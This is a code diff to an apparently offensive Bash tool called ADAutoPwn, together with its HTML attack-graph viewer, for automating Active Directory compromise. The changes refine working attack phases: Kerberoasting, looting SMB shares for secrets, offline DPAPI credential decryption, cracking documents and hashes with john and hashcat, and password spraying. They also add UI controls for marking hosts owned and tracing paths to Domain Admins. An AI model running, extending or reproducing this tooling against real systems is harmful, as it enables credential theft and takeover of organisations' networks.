@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.6.0"
+readonly VERSION="1.8.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -153,6 +153,12 @@ declare -a CRED_QUEUE=()          # pending creds to assess: "user|pass|hash"
 declare -A SEEN_CREDS=()          # already-assessed users (avoid loops)
 declare -A FOUND_SECRETS=()       # every plaintext password we recover (for spraying)
 declare -A SPRAYED=()             # password→done, so we don't spray twice
+# Cross-iteration memo: the pivot loop re-runs every phase for each new identity,
+# but some work is wasteful to repeat. These dedup it so a re-run doesn't crack
+# the same document / roast+crack the same account five times over.
+declare -A CRACKED_DOCS=()        # doc basename → already cracked/attempted
+declare -A TRIED_HASHES=()        # per-account (krb) or per-hash (ntlm) → already cracked-attempted
+KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
 DOMAIN_WL=""                      # path to the generated domain-focused wordlist
 
 # ===========================================================================
@@ -760,6 +766,11 @@ phase_auth_enum() {
 # ===========================================================================
 phase_kerberoast() {
     [[ "$HAVE_AUTH" != "1" ]] && return
+    # Any authenticated user can request a TGS for every SPN, so the roastable set
+    # is domain-wide — request it ONCE, not once per pivoted identity. (--abuse
+    # WriteSPN handles roasting any account it newly SPN-enables on its own.)
+    [[ "$KERB_DONE" == "1" ]] && return
+    KERB_DONE=1
     section "PHASE 6 · KERBEROASTING (service accounts with SPNs)"
     [[ "$CAP_KERBEROS" != "1" ]] && { warn "Kerberos (88) not exposed → Kerberoasting not possible"; return; }
     have impacket-GetUserSPNs || { warn "impacket-GetUserSPNs unavailable, skipping"; return; }
@@ -1126,9 +1137,12 @@ phase_winrm_dpapi() {
         grep -qiE '\[CREDENTIAL\]|Saved' "$OUTDIR/dpapi.txt" 2>/dev/null && loot "DPAPI credential blobs decrypted → dpapi.txt"
     fi
 
-    # Flag DPAPI material pulled from shares earlier (offline decryption guidance)
-    if find "$OUTDIR/shares" -ipath '*Protect*' -o -ipath '*Credentials*' 2>/dev/null | grep -q .; then
-        warn "Offline DPAPI blobs in looted shares → impacket-dpapi (masterkey then credential)"
+    # Flag DPAPI material pulled from shares earlier. `-print -quit` stops find at
+    # the first hit → tiny output, so grep -q can't SIGPIPE find under pipefail
+    # (which would falsely report "no blobs"). Offline decryption itself runs
+    # automatically inside phase_share_loot (phase_dpapi_offline).
+    if find "$OUTDIR/shares" \( -ipath '*Protect*' -o -ipath '*Credentials*' \) -print -quit 2>/dev/null | grep -q .; then
+        info "Offline DPAPI blobs present in looted shares (auto-decrypted in the share-looting phase)"
     fi
 }
 
@@ -1514,6 +1528,9 @@ run_cleanup() {
 crack_file() {
     local f="$1" base ext tool
     base="$(basename "$f")"; ext="${base##*.}"; ext="${ext,,}"
+    # Already cracked/attempted this doc in a previous pivot pass → don't redo it
+    # (the recovered password is already in FOUND_SECRETS). Saves re-running john.
+    [[ -n "${CRACKED_DOCS[$base]:-}" ]] && return
     case "$ext" in
         xls|xlsx|xlsm|doc|docx|ppt|pptx) tool=office2john ;;
         pdf)  tool=pdf2john ;;
@@ -1527,6 +1544,7 @@ crack_file() {
     local hashf="$OUTDIR/filehash_${base}.txt"
     "$tool" "$f" 2>/dev/null >"$hashf"
     [[ ! -s "$hashf" ]] && { rm -f "$hashf"; return; }
+    CRACKED_DOCS["$base"]=1     # mark attempted now → future passes skip it
     loot "Crackable hash extracted from ${C_BOLD}${base}${C_RESET} → cracking with john…"
     run "john --wordlist=$WORDLIST $hashf"
     john --wordlist="$WORDLIST" "$hashf" >/dev/null 2>&1
@@ -1578,7 +1596,11 @@ decrypt_and_read() {
 # pure numbers, and long base64/hex blobs (keys, not creds). Keeps real ones
 # like football1 / M1XyC9pW7qT5Vn while dropping {GUID}, 0x01C0…, base64 keys.
 _plausible_secret() {
-    local s="$1" n=${#s}
+    # NOTE: keep these on separate lines. `local s="$1" n=${#s}` expands ${#s}
+    # against the CALLER's `s` (dynamic scope), not the one just assigned — so n
+    # would be wrong (0, or the caller's length) unless the caller happens to use
+    # a var named `s`. That silently broke DPAPI ingestion (caller var was `p`).
+    local s="$1"; local n=${#s}
     (( n < 6 || n > 40 )) && return 1
     [[ "$s" =~ ^\{?[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}\}?$ ]] && return 1   # GUID
     [[ "$s" =~ ^0[xX][0-9a-fA-F]+$ ]] && return 1                                          # hex literal
@@ -1642,9 +1664,21 @@ phase_share_loot() {
     local args; mapfile -t args < <(nxc_cred_args)
     local dl="$OUTDIR/shares"; mkdir -p "$dl"
 
-    subsection "Spidering readable shares and downloading files (≤5MB)"
-    run "$NXC smb $DCT ${args[*]} -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 OUTPUT_FOLDER=$dl"
-    $NXC smb "$DCT" "${args[@]}" -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 OUTPUT_FOLDER="$dl" 2>&1 \
+    # Only pull INTERESTING files. Without filters the spider drags down whole
+    # roaming/user profiles (browser caches, search indexes, registry tx logs,
+    # thumbnails…) — hundreds of junk files that bury real loot and flood the
+    # password harvester with garbage tokens. spider_plus is exclude-based, so we
+    # strip known-noise extensions and folder/name substrings. DPAPI material is
+    # explicitly preserved: masterkeys (GUID, no ext), Credentials (hex, no ext)
+    # and Vault (.vpol/.vcrd) match no exclusion below, and the Protect/
+    # Credentials/Vault folders aren't filtered → offline DPAPI still gets fed.
+    # NOTE: EXCLUDE_FILTER substrings must be space-free (nxc -o is space-split).
+    local skip_exts="ico,lnk,db,db-wal,db-shm,ldb,log,dat,tmp,blf,regtrans-ms,pma,chk,etl,evtx,jfm,mui,cat,manifest,sqlite,sqlite-wal,sqlite-shm,png,jpg,jpeg,gif,bmp,svg,ttf,otf,woff,woff2,eot,sst,cdp,search-ms,url,theme,thmx,automaticdestinations-ms,customdestinations-ms"
+    local skip_dirs="ipc\$,Cache,Crashpad,BrowserMetrics,Packages,ConnectedDevicesPlatform,PenWorkspace,Temp,Edge,Chromium,Mozilla,GPUCache,History,Cookies"
+    subsection "Spidering readable shares → interesting files only (≤5MB)"
+    run "$NXC smb $DCT ${args[*]} -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 EXCLUDE_EXTS=$skip_exts EXCLUDE_FILTER=$skip_dirs OUTPUT_FOLDER=$dl"
+    $NXC smb "$DCT" "${args[@]}" -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 \
+        EXCLUDE_EXTS="$skip_exts" EXCLUDE_FILTER="$skip_dirs" OUTPUT_FOLDER="$dl" 2>&1 \
         | tail -25 | tee -a "$LOGFILE"
 
     local files; files=$(find "$dl" -type f 2>/dev/null)
@@ -1655,11 +1689,13 @@ phase_share_loot() {
     grep -rEisn 'password|passwd|pwd=|connectionstring|secret|api[_-]?key|cpassword' "$dl" 2>/dev/null \
         | grep -vEi '\.(dll|exe|png|jpg)' | head -40 | tee "$OUTDIR/share_secrets.txt"
     [[ -s "$OUTDIR/share_secrets.txt" ]] && loot "Potential secrets in files → share_secrets.txt"
-    # Harvest passwords from small text/config files and feed the engine
-    # Skip SYSVOL/GPO policy trees — they're full of GUIDs/registry hex that
-    # pollute (and slow) the spray, not real credentials.
+    # Harvest passwords from small text/config files and feed the engine.
+    # Skip: SYSVOL/GPO policy trees (GUIDs/registry hex), per-user AppData
+    # profiles (browser/app junk → garbage tokens that flood the spray) and
+    # desktop.ini stubs. Real share docs (IT/HR/Finance/etc.) are kept.
     find "$dl" -type f -size -200k \
-        -not -ipath '*/sysvol/*' -not -ipath '*/policies/*' \
+        -not -ipath '*/sysvol/*' -not -ipath '*/policies/*' -not -ipath '*/AppData/*' \
+        -not -iname 'desktop.ini' \
         \( -iname '*.txt' -o -iname '*.ini' -o -iname '*.config' \
         -o -iname '*.xml' -o -iname '*.ps1' -o -iname '*.bat' -o -iname '*.conf' -o -iname '*.cnf' \) \
         -exec cat {} + 2>/dev/null | harvest_secrets "shares"
@@ -1682,7 +1718,12 @@ phase_share_loot() {
     fi
 
     # DPAPI material looted from shares → try to decrypt it offline, automatically
-    if echo "$files" | grep -qiE 'Protect/|Credentials|Vault|masterkey'; then
+    # here-string, NOT `echo "$files" | grep -q`: under `set -o pipefail`, grep -q
+    # matches early and exits, echo dies on SIGPIPE, and the pipeline reports
+    # failure even though there WAS a match → the block would be skipped (this is
+    # exactly why offline DPAPI silently never ran once the spider pulled enough
+    # files for grep to short-circuit before echo finished writing).
+    if grep -qiE 'Protect/|Credentials|Vault|masterkey' <<<"$files"; then
         phase_dpapi_offline "$dl"
     fi
 }
@@ -1745,7 +1786,7 @@ phase_dpapi_offline() {
         [[ -z "$blob" ]] && continue
         for k in "${MKEYS[@]}"; do
             out=$(impacket-dpapi credential -file "$blob" -key "0x$k" 2>/dev/null)
-            printf '%s' "$out" | grep -qiE 'Username|Target' || continue
+            grep -qiE 'Username|Target' <<<"$out" || continue   # here-string: avoid pipefail+SIGPIPE
             _dpapi_ingest "$out" "$(basename "$blob")" && break
         done
     done < <(find "$dl" -type f -ipath '*credentials*' ! -iname '*.pol' 2>/dev/null)
@@ -1925,19 +1966,45 @@ gen_domain_wordlist() {
 crack_hashes() {
     local file="$1" mode="$2" label="$3"
     [[ ! -s "$file" ]] && return
+
+    # Cross-iteration dedup: the pivot loop re-roasts the same SPN/AS-REP accounts
+    # (and re-dumps the same NTLM hashes) every pass. Cracking them again is pure
+    # waste — same hash, same wordlist. Key by ACCOUNT for Kerberos hashes (the
+    # encrypted blob carries a fresh nonce each request, so the hash STRING differs
+    # even though the account/password don't), and by the hash line for NTLM.
+    local work line k; work="$(mktemp)"
+    while IFS= read -r line; do
+        [[ -z "$line" ]] && continue
+        case "$label" in
+            AS-REP)     k=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@:]+' <<<"$line" | head -1) ;;
+            Kerberoast) k=$(grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+'  <<<"$line" | head -1) ;;
+            *)          k="$line" ;;
+        esac
+        [[ -z "$k" ]] && k="$line"
+        k="${label}::${k}"
+        [[ -n "${TRIED_HASHES[$k]:-}" ]] && continue
+        TRIED_HASHES["$k"]=1
+        printf '%s\n' "$line" >>"$work"
+    done <"$file"
+    if [[ ! -s "$work" ]]; then
+        rm -f "$work"
+        info "$label hashes already cracked/attempted in an earlier pass → skipping re-crack"
+        return
+    fi
+
     subsection "Cracking $label (hashcat -m $mode)"
     # 1) domain-focused candidates first (fast, high hit-rate), then rockyou
     if [[ -s "$DOMAIN_WL" ]]; then
         run "hashcat -m $mode <file> domain_wordlist.txt -O"
-        hashcat -m "$mode" "$file" "$DOMAIN_WL" -O 2>&1 | tee -a "$LOGFILE"
+        hashcat -m "$mode" "$work" "$DOMAIN_WL" -O 2>&1 | tee -a "$LOGFILE"
     fi
     if [[ -f "$WORDLIST" ]]; then
         run "hashcat -m $mode <file> $WORDLIST -O"
-        hashcat -m "$mode" "$file" "$WORDLIST" -O 2>&1 | tee -a "$LOGFILE"
+        hashcat -m "$mode" "$work" "$WORDLIST" -O 2>&1 | tee -a "$LOGFILE"
     elif [[ ! -s "$DOMAIN_WL" ]]; then
-        warn "No wordlist available, skipping $label cracking"; return
+        warn "No wordlist available, skipping $label cracking"; rm -f "$work"; return
     fi
-    local cracked; cracked=$(hashcat -m "$mode" "$file" --show 2>/dev/null)
+    local cracked; cracked=$(hashcat -m "$mode" "$work" --show 2>/dev/null); rm -f "$work"
     if [[ -n "$cracked" ]]; then
         loot "★★★ CRACKED CREDENTIALS ($label) ★★★"
         echo "$cracked" | while IFS= read -r line; do echo -e "      ${C_GREEN}${C_BOLD}$line${C_RESET}"; done
@@ -2024,7 +2091,7 @@ HTML_TEMPLATE = r'''<!doctype html>
   #results .r:hover,#results .r.sel{background:rgba(125,255,196,.10)}
   #results .r .d{width:9px;height:9px;border-radius:50%;flex:0 0 auto;box-shadow:0 0 8px currentColor}
   #results .r small{color:var(--muted);margin-left:auto}
-  #dock{position:fixed;top:74px;left:20px;z-index:5;display:flex;flex-direction:column;gap:6px;max-width:210px}
+  #dock{position:fixed;top:120px;left:20px;z-index:5;display:flex;flex-direction:column;gap:6px;max-width:210px}
   #dock .qlabel{font-size:9.5px;letter-spacing:1.6px;color:#5b6677;margin:8px 2px 1px;font-weight:700}
   .tab.active{border-color:rgba(255,210,74,.7);color:#ffd24a;background:rgba(255,210,74,.08)}
   .tab{cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;color:var(--ink);text-align:left;
@@ -2032,7 +2099,7 @@ HTML_TEMPLATE = r'''<!doctype html>
     box-shadow:0 8px 26px rgba(0,0,0,.4);transition:.15s}
   .tab:hover{border-color:rgba(125,255,196,.45);color:#9bf3cf}
   .tab.on{border-color:rgba(255,45,109,.6);color:#ff8fb0}
-  #findings{position:fixed;top:74px;left:170px;z-index:6;width:340px;max-height:calc(100% - 150px);
+  #findings{position:fixed;top:120px;left:170px;z-index:6;width:340px;max-height:calc(100% - 150px);
     display:none;flex-direction:column;overflow:hidden}
   #findings.show{display:flex}
   #findings .fhead{display:flex;align-items:center;justify-content:space-between;padding:13px 15px;border-bottom:1px solid var(--line);font-weight:700;font-size:13px}
@@ -2066,6 +2133,8 @@ HTML_TEMPLATE = r'''<!doctype html>
   .badge.hv{color:#1a1300;background:linear-gradient(90deg,#ffe08a,#ffc107);border:none}
   .badge.owned{color:#fff;background:linear-gradient(90deg,#ff5b5b,#c81e1e);border:none}
   .badge.t{color:var(--ink);background:rgba(255,255,255,.06)}
+  .badge.own-toggle{cursor:pointer;color:#ff9db0;border-color:rgba(255,59,59,.5);user-select:none}
+  .badge.own-toggle:hover{background:rgba(255,59,59,.15);color:#fff}
   #panel .close{position:absolute;top:16px;right:16px;cursor:pointer;color:var(--muted);font-size:20px;
     width:30px;height:30px;line-height:28px;text-align:center;border-radius:8px;transition:.15s}
   #panel .close:hover{background:rgba(255,255,255,.08);color:#fff}
@@ -2099,6 +2168,18 @@ HTML_TEMPLATE = r'''<!doctype html>
 </head>
 <body>
 <canvas id="c"></canvas>
+<div id="empty" style="position:fixed;inset:0;z-index:1;display:flex;align-items:center;justify-content:center;pointer-events:none">
+  <div style="text-align:center;max-width:520px;padding:26px 30px;color:#9aa7b8;line-height:1.7">
+    <div style="font-size:30px;margin-bottom:10px">&#128375;&#65039;</div>
+    <div style="font-size:15px;color:#cfe8ff;font-weight:600;margin-bottom:8px">The graph starts empty — you drive it</div>
+    <div style="font-size:13px">
+      &#128269; <b style="color:#dbe6f3">Search</b> a user/computer, or pick a <b style="color:#dbe6f3">VIEW</b> on the left.<br>
+      Click a node to expand what hangs off it.<br>
+      <span style="color:#ff8a8a">&#9760; Right-click a node (or press <b>O</b>) to mark it owned</span> — then
+      <b style="color:#ffd24a">&rarr; Domain Admins</b> / <b style="color:#ffd24a">&rarr; DC</b> map your paths.
+    </div>
+  </div>
+</div>
 <div id="header" class="glass">
   <h1>ADAutoPwn · Attack Graph</h1>
   <div class="sub" id="meta"></div>
@@ -2136,7 +2217,7 @@ HTML_TEMPLATE = r'''<!doctype html>
   <div class="row"><span class="ln"></span>Attack path → DA / DC</div>
   <div class="row"><span style="color:var(--gold)">&#9733;</span>High value &nbsp; <span style="color:var(--owned)">&#9760;</span>Owned</div>
 </div>
-<div id="hint" class="glass">scroll = zoom · drag = move · click a node = abuse + expand · search = find anything</div>
+<div id="hint" class="glass">scroll = zoom · drag = move · click = expand · right-click / O = mark owned · search = find anything</div>
 <div id="tip"></div>
 <div id="panel" class="glass">
   <div class="head">
@@ -2172,7 +2253,11 @@ N.forEach((n,i)=>{n._i=i; n.r=(n.type==="Domain"?14:n.hv?10:7)+Math.min(deg[i]*0
 // Directed adjacency (s → t) for shortest-path queries, like BloodHound.
 const outAdj=N.map(()=>[]), inAdj=N.map(()=>[]);
 E.forEach((e,i)=>{ outAdj[e.s].push([e.t,i]); inAdj[e.t].push([e.s,i]); });
-const ownedIdx=[...N.keys()].filter(i=>N[i].owned);
+// owned is mutable: the operator marks/unmarks nodes live in the graph
+// (right-click a node, press "o", or use the panel button). Any --owned seed
+// from the scan just pre-fills it; it is NOT required.
+let ownedIdx=[...N.keys()].filter(i=>N[i].owned);
+function recomputeOwned(){ ownedIdx=[...N.keys()].filter(i=>N[i].owned); }
 const hvIdx=[...N.keys()].filter(i=>N[i].hv);
 const _U=s=>(s||"").toUpperCase();
 const _dcShort=_U(DCHOST).split(".")[0];
@@ -2207,25 +2292,33 @@ const vis=new Set();
 let visArr=[], VE=[], curView="owned";
 function refresh(){ visArr=[...vis]; const s=new Set();
   visArr.forEach(i=>incE[i].forEach(ei=>{const e=E[ei]; if(vis.has(e.s)&&vis.has(e.t))s.add(ei);}));
-  VE=[...s]; updateCount(); }
+  VE=[...s]; updateCount(); if(typeof updateHint==="function") updateHint(); }
 function expand(i){ vis.add(i); nb[i].forEach(j=>vis.add(j)); refresh(); reheat(); }
 
 // Switch the displayed query/view. Reseeds positions for a clean layout.
 function applyView(q){
   curView=q; vis.clear(); PATHSET.clear();
-  if(q==="owned"){ (ownedIdx.length?ownedIdx:hvIdx).forEach(i=>{ vis.add(i); nb[i].forEach(j=>vis.add(j)); }); }
+  if(q==="none"){ /* deliberately empty — the boot state */ }
+  else if(q==="owned"){ ownedIdx.forEach(i=>{ vis.add(i); nb[i].forEach(j=>vis.add(j)); }); }
   else if(q==="hv"){ hvIdx.forEach(i=>vis.add(i)); }
   else if(q==="all"){ N.forEach((_,i)=>vis.add(i)); }
   else { const tgt=(q==="dc")?dcSet:daSet; const r=pathsTo(tgt);
          r.nodes.forEach(i=>vis.add(i)); r.edges.forEach(e=>PATHSET.add(e)); tgt.forEach(t=>vis.add(t)); }
-  if(vis.size<1){ [...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,15).forEach(i=>vis.add(i)); }
+  // For DA/DC/High-value, never leave the operator staring at a blank canvas.
+  // For "none" (boot) and "owned" we intentionally allow an empty set — owned is
+  // whatever the operator has marked, and an empty graph is the desired start.
+  if(vis.size<1 && q!=="none" && q!=="owned"){ [...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,15).forEach(i=>vis.add(i)); }
   [...vis].forEach(i=>{const a=Math.random()*6.28,rad=120+Math.random()*260;
     N[i].x=Math.cos(a)*rad; N[i].y=Math.sin(a)*rad; N[i].vx=N[i].vy=0; N[i].fx=N[i].fy=null;});
   refresh(); if(typeof select==="function") select(-1);
   document.querySelectorAll('#dock .q').forEach(b=>b.classList.toggle('active', b.dataset.q===q));
+  if(typeof updateHint==="function") updateHint(q);
   if(typeof warmup==="function") warmup();
 }
-applyView("owned");   // initial (no warmup yet — boot does it)
+// NOTE: do NOT call applyView() here. select(-1) (reached via applyView)
+// assigns to `let sel`, which is still in its temporal dead zone at this
+// point in parsing → a ReferenceError would abort the entire script and
+// leave a blank canvas. The boot block at the bottom calls applyView().
 
 const cv=document.getElementById("c"), ctx=cv.getContext("2d");
 let W=0,Hh=0,DPR=Math.min(window.devicePixelRatio||1,2);
@@ -2368,6 +2461,9 @@ addEventListener("mouseup",ev=>{
 cv.addEventListener("wheel",ev=>{ev.preventDefault();const f=ev.deltaY<0?1.12:1/1.12;
   const [wx,wy]=toWorld(ev.clientX,ev.clientY); scale=Math.max(0.15,Math.min(4,scale*f));
   tx=ev.clientX-wx*scale; ty=ev.clientY-wy*scale; requestDraw();},{passive:false});
+// Right-click a node → toggle owned (no menu, no file needed).
+cv.addEventListener("contextmenu",ev=>{const i=pick(ev.clientX,ev.clientY);
+  if(i>=0){ev.preventDefault(); toggleOwned(i);}});
 
 // ---- selection + panel ----
 function select(i){sel=i; const p=document.getElementById("panel"); requestDraw();
@@ -2378,8 +2474,21 @@ function select(i){sel=i; const p=document.getElementById("panel"); requestDraw(
   let b=""; if(n.hv)b+="<span class='badge hv'>&#9733; HIGH VALUE</span>";
   if(n.owned)b+="<span class='badge owned'>&#9760; OWNED</span>";
   b+="<span class='badge t'>"+deg[i]+" edges</span>";
+  b+="<span class='badge own-toggle' id='ownbtn' title='Toggle owned (or press O / right-click the node)'>"+
+     (n.owned?"&#9760; unmark owned":"&#9760; mark owned")+"</span>";
   document.getElementById("pbadges").innerHTML=b;
+  const ob=document.getElementById("ownbtn"); if(ob) ob.onclick=()=>toggleOwned(i);
   renderBody(i);
+}
+// Mark/unmark a node as compromised, live. Owned drives the "Owned" view and the
+// → Domain Admins / → DC shortest-path queries, so the operator controls the
+// whole attack-path picture straight from the graph — no --owned file needed.
+function toggleOwned(i){ if(i<0||i==null)return;
+  N[i].owned=!N[i].owned; recomputeOwned();
+  if(sel===i) select(i);              // refresh the panel badge/button
+  if(curView==="owned"||curView==="da"||curView==="dc") applyView(curView);
+  requestDraw();
+  toast(N[i].owned?"Marked owned ☠":"Unmarked owned");
 }
 function renderBody(i){
   const n=N[i]; let h="";
@@ -2420,8 +2529,10 @@ function nshort(s){return (s||"").split("@")[0];}
 function key(l){return (l||"").toLowerCase().replace(/[^a-z]/g,"");}
 function esc(s){return (s+"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
 function escAttr(s){return esc(s).replace(/'/g,"&#39;");}
-function copy(t){navigator.clipboard&&navigator.clipboard.writeText(t);const e=document.getElementById("toast");
-  e.classList.add("show");setTimeout(()=>e.classList.remove("show"),1100);}
+let _toastT=0;
+function toast(msg){const e=document.getElementById("toast"); if(!e)return; e.textContent=msg||"copied";
+  e.classList.add("show"); clearTimeout(_toastT); _toastT=setTimeout(()=>e.classList.remove("show"),1100);}
+function copy(t){navigator.clipboard&&navigator.clipboard.writeText(t);toast("copied");}
 document.getElementById("pclose").addEventListener("click",()=>select(-1));
 
 // ---- bring a node (or an edge's two ends) into view + select ----
@@ -2496,13 +2607,23 @@ function warmup(iters){ alpha=1; for(let k=0;k<(iters||420);k++) step(); fit(); 
 // ---- VIEW buttons (Owned · → Domain Admins · → DC · High value · Everything)
 document.querySelectorAll('#dock .q').forEach(b=>b.addEventListener("click",()=>applyView(b.dataset.q)));
 
-// ---- reset = back to the Owned view ----
+// ---- reset = clear back to the empty start ----
 const rb=document.getElementById("reset");
-if(rb) rb.addEventListener("click",()=>{ q.value=""; matches=[]; renderResults(); applyView("owned"); });
-addEventListener("keydown",ev=>{if(ev.key==="Escape"){select(-1);closeFindings();}});
+if(rb) rb.addEventListener("click",()=>{ q.value=""; matches=[]; renderResults(); applyView("none"); });
+addEventListener("keydown",ev=>{
+  if(ev.target&&/^(INPUT|TEXTAREA)$/.test(ev.target.tagName)) return;   // don't hijack the search box
+  if(ev.key==="Escape"){select(-1);closeFindings();}
+  else if((ev.key==="o"||ev.key==="O") && sel>=0){ toggleOwned(sel); }   // O = mark/unmark selected
+});
 
-// ---- boot ----
-resize(); applyView("owned"); warmup();
+// ---- empty-state hint: the graph starts blank; this tells the operator how to
+// populate it (search / pick a view / mark owned). Hidden as soon as nodes show.
+function updateHint(){ const el=document.getElementById("empty"); if(!el)return;
+  el.style.display = (visArr.length? "none":"flex"); }   // flex → keeps it centered
+
+// ---- boot: start EMPTY. The operator drives the graph — search a node, pick a
+// view, or right-click / press O to mark owned. Nothing is shown until then.
+resize(); applyView("none");
 </script>
 </body>
 </html>
